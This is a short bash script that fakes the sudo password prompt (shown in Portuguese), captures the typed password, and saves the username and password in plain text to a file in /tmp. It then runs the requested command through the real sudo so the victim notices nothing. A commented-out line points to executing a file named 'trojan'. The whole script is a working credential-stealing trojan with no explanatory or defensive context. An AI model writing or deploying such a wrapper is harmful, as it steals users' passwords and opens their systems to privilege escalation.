#!/bin/bash

function get_shell (){

	realPCsudo=$(which sudo)
	
	read -s -p "[sudo] senha para $USER: " user_sudo_password
	printf "\n"

	printf '%s\n' "username: $USER | password: $user_sudo_password" > /tmp/content_extra_file
	#echo "USER: $USER : Sudo Password: $user_sudo_passowrd" > /tmp/content_extra_file # create a random name

	echo "$user_sudo_password" | sudo -S $@


	#exec /home/$USER/trojan


}

get_shell $@
